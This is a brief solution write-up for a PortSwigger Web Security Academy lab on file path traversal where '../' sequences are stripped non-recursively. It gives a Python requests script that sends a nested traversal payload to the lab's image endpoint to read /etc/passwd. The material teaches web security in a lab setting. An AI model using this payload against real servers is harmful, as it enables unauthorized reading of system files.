# Lab: File path traversal, traversal sequences stripped non-recursively

link to lab: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

Solution: 

```python
import requests

response = requests.get(
    'https://0af000710374374dc343f638005c00e0.web-security-academy.net/image?filename=....//....//....//etc//passwd',
    verify=False,
)

print(response.text)
```